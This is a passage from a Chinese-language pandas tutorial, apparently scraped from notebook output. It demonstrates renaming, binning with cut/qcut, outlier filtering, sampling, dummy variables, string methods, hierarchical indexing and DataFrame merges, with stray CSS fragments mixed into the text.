'New York'], columns=['one', 'two', 'three', 'four'])data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four Ohio 0 1 2 3 Colorado 4 5 6 7 New York 8 9 10 11 跟Series一样，轴索引也有一个map方法： 12transform = lambda x: x[:4].upper()data.index.map(transform) Index([&apos;OHIO&apos;, &apos;COLO&apos;, &apos;NEW &apos;], dtype=&apos;object&apos;) 将其赋值给index，这样就可以对DataFrame进行就地修改： 12data.index = data.index.map(transform)data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four OHIO 0 1 2 3 COLO 4 5 6 7 NEW 8 9 10 11 如果想要创建数据集的转换版（而不是修改原始数据），比较实用的方法是rename： 1data.rename(index=str.title, columns=str.upper) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ONE TWO THREE FOUR Ohio 0 1 2 3 Colo 4 5 6 7 New 8 9 10 11 rename可以结合字典型对象实现对部分轴标签的更新： 1data.rename(index=&#123;'OHIO': 'INDIANA'&#125;, columns=&#123;'three': 'peekaboo'&#125;) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two peekaboo four INDIANA 0 1 2 3 COLO 4 5 6 7 NEW 8 9 10 11 rename可以实现复制DataFrame并对其索引和列标签进行赋值。如果希望就地修改某个数据集，传入 inplace=True 即可： 12data.rename(index=&#123;'OHIO': 'INDIANA'&#125;, inplace=True)data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four INDIANA 0 1 2 3 COLO 4 5 6 7 NEW 8 9 10 11 离散化和面元划分为了便于分析，连续数据常常被离散化或拆分为“面元”（bin）。假设有一组人员数据，而你希望将它们划分为不同的年龄组： 1ages = [20, 22, 25, 27, 21, 23, 37, 31, 61, 45, 41, 32] 接下来将这些数据划分为“18到25”、“26到35”、“35到60”以及“60以上”几个面元。要实现该功能，你需要使用pandas的cut函数： 123bins = [18, 25, 35, 60, 100]cats = pd.cut(ages, bins)cats [(18, 25], (18, 25], (18, 25], (25, 35], (18, 25], ..., (25, 35], (60, 100], (35, 60], (35, 60], (25, 35]] Length: 12 Categories (4, interval[int64]): [(18, 25] &lt; (25, 35] &lt; (35, 60] &lt; (60, 100]] pandas返回的是一个特殊的Categorical对象。结果展示了pandas.cut划分的面元。你可以将其看做一组表示面元名称的字符串。它的底层含有一个表示不同分类名称的类型数组，以及一个codes属性中的年龄数据的标签： 12# 统计值所在的元面cats.codes array([0, 0, 0, 1, 0, 0, 2, 1, 3, 2, 2, 1], dtype=int8) 12# 获得分组cats.categories IntervalIndex([(18, 25], (25, 35], (35, 60], (60, 100]] closed=&apos;right&apos;, dtype=&apos;interval[int64]&apos;) 12# pd.value_counts(cats)是pandas.cut结果的面元计数。pd.value_counts(cats) (18, 25] 5 (35, 60] 3 (25, 35] 3 (60, 100] 1 dtype: int64 跟“区间”的数学符号一样，圆括号表示开端，而方括号则表示闭端（包括）。哪边是闭端可以通过right=False进行修改： 1pd.cut(ages, [18, 26, 36, 61, 100], right=False) [[18, 26), [18, 26), [18, 26), [26, 36), [18, 26), ..., [26, 36), [61, 100), [36, 61), [36, 61), [26, 36)] Length: 12 Categories (4, interval[int64]): [[18, 26) &lt; [26, 36) &lt; [36, 61) &lt; [61, 100)] 通过传递一个列表或数组到labels，设置自己的面元名称： 12group_names = ['Youth', 'YoungAdult', 'MiddleAged', 'Senior']pd.cut(ages, bins, labels=group_names) [Youth, Youth, Youth, YoungAdult, Youth, ..., YoungAdult, Senior, MiddleAged, MiddleAged, YoungAdult] Length: 12 Categories (4, object): [Youth &lt; YoungAdult &lt; MiddleAged &lt; Senior] 如果向cut传入的是面元的数量而不是确切的面元边界，则它会根据数据的最小值和最大值计算等长面元。 123data = np.random.rand(20)# 等分成 4 份， 选项precision=2，限定小数只有两位。pd.cut(data, 4, precision=2) [(0.49, 0.72], (0.015, 0.25], (0.49, 0.72], (0.49, 0.72], (0.25, 0.49], ..., (0.25, 0.49], (0.25, 0.49], (0.72, 0.96], (0.015, 0.25], (0.25, 0.49]] Length: 20 Categories (4, interval[float64]): [(0.015, 0.25] &lt; (0.25, 0.49] &lt; (0.49, 0.72] &lt; (0.72, 0.96]] qcut是一个非常类似于cut的函数，它可以根据样本分位数对数据进行面元划分。根据数据的分布情况，cut可能无法使各个面元中含有相同数量的数据点。而qcut由于使用的是样本分位数，因此可以得到大小基本相等的面元： 123data = np.random.randn(1000)cats = pd.qcut(data, 4)cats [(-0.694, -0.0168], (-3.589, -0.694], (0.638, 3.369], (-0.0168, 0.638], (-3.589, -0.694], ..., (-0.694, -0.0168], (-3.589, -0.694], (-0.694, -0.0168], (-3.589, -0.694], (-0.0168, 0.638]] Length: 1000 Categories (4, interval[float64]): [(-3.589, -0.694] &lt; (-0.694, -0.0168] &lt; (-0.0168, 0.638] &lt; (0.638, 3.369]] 1pd.value_counts(cats) (0.638, 3.369] 250 (-0.0168, 0.638] 250 (-0.694, -0.0168] 250 (-3.589, -0.694] 250 dtype: int64 检测和过滤异常值过滤或变换异常值在很大程度上就是运用数组运算。来看一个含有正态分布数据的DataFrame： 12data = pd.DataFrame(np.random.randn(1000, 4))data.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 3 count 1000.000000 1000.000000 1000.000000 1000.000000 mean -0.064053 -0.005447 0.038026 0.024811 std 0.999489 0.948043 0.953395 1.021102 min -3.105504 -2.844008 -2.760611 -4.492430 25% -0.718899 -0.656214 -0.597055 -0.646600 50% -0.020346 -0.019434 0.058547 -0.003166 75% 0.578055 0.649719 0.661221 0.690373 max 3.106261 2.717680 3.289203 3.243883 假设你想要找出某列中绝对值大小超过3的值 12col = data[2]col[np.abs(col) &gt; 3] 308 3.289203 Name: 2, dtype: float64 要选出全部含有“超过3或－3的值”的行，你可以在布尔型DataFrame中使用any方法： 1data[(np.abs(data) &gt; 3).any(1)] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 3 8 -3.105504 -0.094313 -0.186817 0.461499 96 0.522268 -0.201284 0.145961 3.151065 121 3.106261 -2.029135 -0.179609 -0.478008 148 0.019824 0.115120 1.005103 -4.492430 308 0.770344 -0.635648 3.289203 -0.151866 434 -0.594539 -0.124445 0.535540 3.243883 454 0.196540 0.002230 1.150842 -3.098229 475 1.327124 0.532669 -0.285367 3.095290 604 1.154687 0.336886 -0.767514 3.229107 659 -3.076200 -0.979556 0.653771 0.559905 排列和随机采样利用 numpy.random.permutation 函数可以轻松实现对Series或DataFrame的列的排列工作（permuting，随机重排序）。通过需要排列的轴的长度调用 permutation，可产生一个表示新顺序的整数数组： 12df = pd.DataFrame(np.arange(5 * 4).reshape((5, 4)))df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 3 0 0 1 2 3 1 4 5 6 7 2 8 9 10 11 3 12 13 14 15 4 16 17 18 19 12sampler = np.random.permutation(5)sampler array([2, 1, 4, 3, 0]) 然后就可以在基于iloc的索引操作或take函数中使用该数组了： 1df.take(sampler) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 3 2 8 9 10 11 1 4 5 6 7 4 16 17 18 19 3 12 13 14 15 0 0 1 2 3 选取随机子集（不重复的） 1df.sample(n=3) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 3 3 12 13 14 15 1 4 5 6 7 2 8 9 10 11 选取随机子集（允许重复）,不能操作 DateFrame 12choices = pd.Series([5, 7, -1, 6, 4])choices.sample(n=10, replace=True) 0 5 4 4 0 5 0 5 2 -1 3 6 3 6 3 6 3 6 0 5 dtype: int64 1choices 0 5 1 7 2 -1 3 6 4 4 dtype: int64 计算指标/哑变量另一种常用于统计建模或机器学习的转换方式是：将分类变量（categorical variable）转换为“哑变量”或“指标矩阵”。 如果DataFrame的某一列中含有k个不同的值，则可以派生出一个k列矩阵或DataFrame（其值全为1和0）。pandas有一个get_dummies函数可以实现该功能（其实自己动手做一个也不难）。使用之前的一个DataFrame例子： 12df = pd.DataFrame(&#123;'key': ['b', 'b', 'a', 'c', 'a', 'b'], 'data1': range(6)&#125;)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key data1 0 b 0 1 b 1 2 a 2 3 c 3 4 a 4 5 b 5 1pd.get_dummies(df['key']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c 0 0 1 0 1 0 1 0 2 1 0 0 3 0 0 1 4 1 0 0 5 0 1 0 有时候，你可能想给指标DataFrame的列加上一个前缀，以便能够跟其他数据进行合并。get_dummies的prefix参数可以实现该功能： 12dummies = pd.get_dummies(df['key'], prefix='key')dummies .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key_a key_b key_c 0 0 1 0 1 0 1 0 2 1 0 0 3 0 0 1 4 1 0 0 5 0 1 0 123# 拼接df_with_dummy = df[['data1']].join(dummies)df_with_dummy .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } data1 key_a key_b key_c 0 0 0 1 0 1 1 0 1 0 2 2 1 0 0 3 3 0 0 1 4 4 1 0 0 5 5 0 1 0 如果DataFrame中的某行同属于多个分类，则事情就会有点复杂。看一下MovieLens 1M数据集 123mnames = ['movie_id', 'title', 'genres']movies = pd.read_table('data/movielens/movies.dat', sep='::', header=None, names=mnames)movies.head() C:\ProgramData\Anaconda3\lib\site-packages\ipykernel_launcher.py:2: ParserWarning: Falling back to the &apos;python&apos; engine because the &apos;c&apos; engine does not support regex separators (separators &gt; 1 char and different from &apos;\s+&apos; are interpreted as regex); you can avoid this warning by specifying engine=&apos;python&apos;. .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } movie_id title genres 0 1 Toy Story (1995) Animation|Children's|Comedy 1 2 Jumanji (1995) Adventure|Children's|Fantasy 2 3 Grumpier Old Men (1995) Comedy|Romance 3 4 Waiting to Exhale (1995) Comedy|Drama 4 5 Father of the Bride Part II (1995) Comedy 要为每个genre添加指标变量就需要做一些数据规整操作。首先，我们从数据集中抽取出不同的genre值： 1234567all_genres = []for x in movies.genres: all_genres.extend(x.split('|'))genres = pd.unique(all_genres)genres array([&apos;Animation&apos;, &quot;Children&apos;s&quot;, &apos;Comedy&apos;, &apos;Adventure&apos;, &apos;Fantasy&apos;, &apos;Romance&apos;, &apos;Drama&apos;, &apos;Action&apos;, &apos;Crime&apos;, &apos;Thriller&apos;, &apos;Horror&apos;, &apos;Sci-Fi&apos;, &apos;Documentary&apos;, &apos;War&apos;, &apos;Musical&apos;, &apos;Mystery&apos;, &apos;Film-Noir&apos;, &apos;Western&apos;], dtype=object) 构建指标DataFrame的方法之一是从一个全零DataFrame开始： 12zero_matrix = np.zeros((len(movies), len(genres)))zero_matrix array([[0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], ..., [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.], [0., 0., 0., ..., 0., 0., 0.]]) 12dummies = pd.DataFrame(zero_matrix, columns=genres)dummies.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Animation Children's Comedy Adventure Fantasy Romance Drama Action Crime Thriller Horror Sci-Fi Documentary War Musical Mystery Film-Noir Western 0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 1 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 2 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 3 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 4 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 现在，迭代每一部电影，并将dummies各行的条目设为1。要这么做，我们使用dummies.columns来计算每个类型的列索引： 12gen = movies.genres[0]gen &quot;Animation|Children&apos;s|Comedy&quot; 1gen.split('|') [&apos;Animation&apos;, &quot;Children&apos;s&quot;, &apos;Comedy&apos;] 12# 获取值对应的下标dummies.columns.get_indexer(gen.split('|')) array([0, 1, 2], dtype=int64) 根据索引，使用.iloc设定值： 123for i, gen in enumerate(movies.genres): indices = dummies.columns.get_indexer(gen.split('|')) dummies.iloc[i, indices] = 1 将其与movies合并起来： 12movies_windic = movies.join(dummies.add_prefix('Genre_'))movies_windic.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } movie_id title genres Genre_Animation Genre_Children's Genre_Comedy Genre_Adventure Genre_Fantasy Genre_Romance Genre_Drama ... Genre_Crime Genre_Thriller Genre_Horror Genre_Sci-Fi Genre_Documentary Genre_War Genre_Musical Genre_Mystery Genre_Film-Noir Genre_Western 0 1 Toy Story (1995) Animation|Children's|Comedy 1.0 1.0 1.0 0.0 0.0 0.0 0.0 ... 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 1 2 Jumanji (1995) Adventure|Children's|Fantasy 0.0 1.0 0.0 1.0 1.0 0.0 0.0 ... 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 2 3 Grumpier Old Men (1995) Comedy|Romance 0.0 0.0 1.0 0.0 0.0 1.0 0.0 ... 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 3 4 Waiting to Exhale (1995) Comedy|Drama 0.0 0.0 1.0 0.0 0.0 0.0 1.0 ... 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 4 5 Father of the Bride Part II (1995) Comedy 0.0 0.0 1.0 0.0 0.0 0.0 0.0 ... 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 5 rows × 21 columns 字符串操作pandas 的矢量化字符串函数123data = &#123;'Dave': 'dave@google.com', 'Steve': 'steve@gmail.com', 'Rob': 'rob@gmail.com', 'Wes': np.nan&#125;data = pd.Series(data)data Dave dave@google.com Steve steve@gmail.com Rob rob@gmail.com Wes NaN dtype: object 1data.isnull() Dave False Steve False Rob False Wes True dtype: bool 通过 data.map，所有字符串和正则表达式方法都能被应用于（传入lambda表达式或其他函数）各个值，但是如果存在 NA（null） 就会报错。为了解决这个问题，Series有一些能够跳过NA值的面向数组方法，进行字符串操作。通过Series的 str 属性即可访问这些方法。例如，我们可以通过 str.contains 检查各个电子邮件地址是否含有”gmail”： 1data.str.contains('gmail') Dave False Steve True Rob True Wes NaN dtype: object 也可以使用正则表达式，还可以加上任意re选项（如IGNORECASE）： 123pattern = '([A-Z0-9._%+-]+)@([A-Z0-9.-]+)\\.([A-Z]&#123;2,4&#125;)'temp = data.str.findall(pattern, flags=re.IGNORECASE)temp Dave [(dave, google, com)] Steve [(steve, gmail, com)] Rob [(rob, gmail, com)] Wes NaN dtype: object 对字符串进行截取 1data.str[:5] Dave dave@ Steve steve Rob rob@g Wes NaN dtype: object 更多的pandas字符串方法 数据规整：聚合、合并和重塑层次化索引层次化索引（hierarchical indexing）是pandas的一项重要功能，它使你能在一个轴上拥有多个（两个以上）索引级别。 12data = pd.Series(np.random.randn(9), index=[['a', 'a', 'a', 'b', 'b', 'c', 'c', 'd', 'd'], [1, 2, 3, 1, 3, 1, 2, 2, 3]])data a 1 1.280879 2 -0.233278 3 0.700301 b 1 0.115678 3 0.390445 c 1 -0.816532 2 -0.972933 d 2 2.053691 3 1.166844 dtype: float64 1data.index MultiIndex(levels=[[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;], [1, 2, 3]], labels=[[0, 0, 0, 1, 1, 2, 2, 3, 3], [0, 1, 2, 0, 2, 0, 1, 1, 2]]) 对于一个层次化索引的对象，可以使用所谓的部分索引，使用它选取数据子集的操作更简单： 1data['b'] 1 0.115678 3 0.390445 dtype: float64 1data['b':'c'] b 1 0.115678 3 0.390445 c 1 -0.816532 2 -0.972933 dtype: float64 1data[['b','c']] b 1 0.115678 3 0.390445 c 1 -0.816532 2 -0.972933 dtype: float64 在“内层”中进行选取 1data.loc[:, 2] a -0.233278 c -0.972933 d 2.053691 dtype: float64 unstack方法将这段数据重新安排到一个DataFrame中： 1data.unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 1 2 3 a 1.280879 -0.233278 0.700301 b 0.115678 NaN 0.390445 c -0.816532 -0.972933 NaN d NaN 2.053691 1.166844 unstack的逆运算是stack： 1data.unstack().stack() a 1 1.280879 2 -0.233278 3 0.700301 b 1 0.115678 3 0.390445 c 1 -0.816532 2 -0.972933 d 2 2.053691 3 1.166844 dtype: float64 对于一个DataFrame，每条轴都可以有分层索引： 123frame = pd.DataFrame(np.arange(12).reshape((4, 3)), index=[['a', 'a', 'b', 'b'], [1, 2, 1, 2]], columns=[['Ohio', 'Ohio', 'Colorado'], ['Green', 'Red', 'Green']])frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } Ohio Colorado Green Red Green a 1 0 1 2 2 3 4 5 b 1 6 7 8 2 9 10 11 各层都可以有名字（可以是字符串，也可以是别的Python对象）。如果指定了名称，它们就会显示在控制台输出中： 123frame.index.names = ['key1', 'key2']frame.columns.names = ['state', 'color']frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key1 key2 a 1 0 1 2 2 3 4 5 b 1 6 7 8 2 9 10 11 有了部分列索引，因此可以轻松选取列分组： 1frame['Ohio'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } color Green Red key1 key2 a 1 0 1 2 3 4 b 1 6 7 2 9 10 1frame.index MultiIndex(levels=[[&apos;a&apos;, &apos;b&apos;], [1, 2]], codes=[[0, 0, 1, 1], [0, 1, 0, 1]], names=[&apos;key1&apos;, &apos;key2&apos;]) 重排与分级排序重新调整某条轴上各级别的顺序，或根据指定级别上的值对数据进行排序。 swaplevel接受两个级别编号或名称，并返回一个互换了级别的新对象（但数据不会发生变化）： 1frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key1 key2 a 1 0 1 2 2 3 4 5 b 1 6 7 8 2 9 10 11 12# 交换 key1 和 key2 位置frame.swaplevel('key1', 'key2') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key2 key1 1 a 0 1 2 2 a 3 4 5 1 b 6 7 8 2 b 9 10 11 sort_index则根据单个级别中的值对数据进行排序。 12# 这里 level = 1 指的是 key2 列frame.sort_index(level=1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key1 key2 a 1 0 1 2 b 1 6 7 8 a 2 3 4 5 b 2 9 10 11 1frame.sort_index(level=0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key1 key2 a 1 0 1 2 2 3 4 5 b 1 6 7 8 2 9 10 11 1frame.swaplevel(0, 1).sort_index(level=0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key2 key1 1 a 0 1 2 b 6 7 8 2 a 3 4 5 b 9 10 11 根据级别汇总统计许多对DataFrame和Series的描述和汇总统计都有一个level选项，它用于指定在某条轴上求和的级别。 1frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key1 key2 a 1 0 1 2 2 3 4 5 b 1 6 7 8 2 9 10 11 12# 列方向 根据 level = key2 求和frame.sum(level='key2') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } state Ohio Colorado color Green Red Green key2 1 6 8 10 2 12 14 16 12# 行方向 更具 level = color 求和frame.sum(level='color', axis=1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } color Green Red key1 key2 a 1 2 1 2 8 4 b 1 14 7 2 20 10 使用DataFrame的列进行索引人们经常想要将DataFrame的一个或多个列当做行索引来用，或者可能希望将行索引变成DataFrame的列。DataFrame的set_index函数会将其一个或多个列转换为行索引，并创建一个新的DataFrame： 1234frame = pd.DataFrame(&#123;'a': range(7), 'b': range(7, 0, -1), 'c': ['one', 'one', 'one', 'two', 'two', 'two', 'two'], 'd': [0, 1, 2, 0, 1, 2, 3]&#125;)frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d 0 0 7 one 0 1 1 6 one 1 2 2 5 one 2 3 3 4 two 0 4 4 3 two 1 5 5 2 two 2 6 6 1 two 3 12frame2 = frame.set_index(['c', 'd'])frame2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d one 0 0 7 1 1 6 2 2 5 two 0 3 4 1 4 3 2 5 2 3 6 1 默认情况下，那些列会从DataFrame中移除，但也可以将其保留下来： 1frame.set_index(['c', 'd'], drop=False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d c d one 0 0 7 one 0 1 1 6 one 1 2 2 5 one 2 two 0 3 4 two 0 1 4 3 two 1 2 5 2 two 2 3 6 1 two 3 reset_index的功能跟set_index刚好相反，层次化索引的级别会被转移到列里面： 1frame2.reset_index() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } c d a b 0 one 0 0 7 1 one 1 1 6 2 one 2 2 5 3 two 0 3 4 4 two 1 4 3 5 two 2 5 2 6 two 3 6 1 合并数据集pandas对象中的数据可以通过一些方式进行合并： pandas.merge可根据一个或多个键将不同DataFrame中的行连接起来。SQL或其他关系型数据库的用户对此应该会比较熟悉，因为它实现的就是数据库的join操作。 pandas.concat可以沿着一条轴将多个对象堆叠到一起。 实例方法combine_first可以将重复数据拼接在一起，用一个对象中的值填充另一个对象中的缺失值。 数据库风格的DataFrame合并数据集的合并（merge）或连接（join）运算是通过一个或多个键将行连接起来的。这些运算是关系型数据库（基于SQL）的核心。pandas的merge函数是对数据应用这些算法的主要切入点。 12345df1 = pd.DataFrame(&#123;'key': ['b', 'b', 'a', 'c', 'a', 'a', 'b'], 'data1': range(7)&#125;)df2 = pd.DataFrame(&#123;'key': ['a', 'b', 'd'], 'data2': range(3)&#125;)df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key data1 0 b 0 1 b 1 2 a 2 3 c 3 4 a 4 5 a 5 6 b 6 1df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key data2 0 a 0 1 b 1 2 d 2 如果没有指定关联的列，merge就会将重叠列的列名当做键。默认情况下，merge做的是“内连接”；结果中的键是交集。 1pd.merge(df1, df2) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key data1 data2 0 b 0 1 1 b 1 1 2 b 6 1 3 a 2 0 4 a 4 0 5 a 5 0 指明要用哪个列进行连接。 1pd.merge(df1, df2, on='key') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key data1 data2 0 b 0 1 1 b 1 1 2 b 6 1 3 a 2 0 4 a 4 0 5 a 5 0 如果两个对象的列名不同，也可以分别进行指定： 12345df3 = pd.DataFrame(&#123;'lkey': ['b', 'b', 'a', 'c', 'a', 'a', 'b'], 'data1': range(7)&#125;)df4 = pd.DataFrame(&#123;'rkey': ['a', 'b', 'd'], 'data2': range(3)&#125;)pd.merge(df3, df4, left_on='lkey', right_on='rkey') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } lkey data1 rkey data2 0 b 0 b 1 1 b 1 b 1 2 b 6 b 1 3 a 2 a 0 4 a 4 a 0 5 a 5 a 0 指定连接方式 1pd.merge(df1, df2, how='outer') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key data1 data2 0 b 0.0 1.0 1 b 1.0 1.0 2 b 6.0 1.0 3 a 2.0 0.0 4 a 4.0 0.0 5 a 5.0 0.0 6 c 3.0 NaN 7 d NaN 2.0 要根据多个键进行合并，传入一个由列名组成的列表即可： 12345678left = pd.DataFrame(&#123;'key1': ['foo', 'foo', 'bar'], 'key2': ['one', 'two', 'one'], 'lval': [1, 2, 3]&#125;)right = pd.DataFrame(&#123;'key1': ['foo', 'foo', 'bar', 'bar'], 'key2': ['one', 'one', 'one', 'two'], 'rval': [4, 5, 6, 7]&#125;)left .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 lval 0 foo one 1 1 foo two 2 2 bar one 3 1right .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 rval 0 foo one 4 1 foo one 5 2 bar one 6 3 bar two 7 1pd.merge(left, right, on=['key1', 'key2'], how='outer') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 lval rval 0 foo one 1.0 4.0 1 foo one 1.0 5.0 2 foo two 2.0 NaN 3 bar one 3.0 6.0 4 bar two NaN 7.0 对于合并运算需要考虑的最后一个问题是对重复列名的处理。虽然你可以手工处理列名重叠的问题（查看前面介绍的重命名轴标签），但merge有一个更实用的suffixes选项，用于指定附加到左右两个DataFrame对象的重叠列名上的字符串： 1pd.merge(left, right, on='key1') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2_x lval key2_y rval 0 foo one 1 one 4 1 foo one 1 one 5 2 foo two 2 one 4 3 foo two 2 one 5 4 bar one 3 one 6 5 bar one 3 two 7 1pd.merge(left, right, on='key1', suffixes=('_left', '_right')) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2_left lval key2_right rval 0 foo one 1 one 4 1 foo one 1 one 5 2 foo two 2 one 4 3 foo two 2 one 5 4 bar one 3 one 6 5 bar one 3 two 7 merge函数的参数 索引上的合并有时候，DataFrame中的连接键位于其索引中。在这种情况下，你可以传入 left_index=True 或 right_index=True（或两个都传）以说明索引应该被用作连接键： 12left1 = pd.DataFrame(&#123;'key': ['a', 'b', 'a', 'a', 'b', 'c'], 'value': range(6)&#125;)left1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key value 0 a 0 1 b 1 2 a 2 3 a 3 4 b 4 5 c 5 12right1 = pd.DataFrame(&#123;'group_val': [3.5, 7]&#125;, index=['a', 'b'])right1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } group_val a 3.5 b 7.0 1pd.merge(left1, right1, left_on='key', right_index=True) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key value 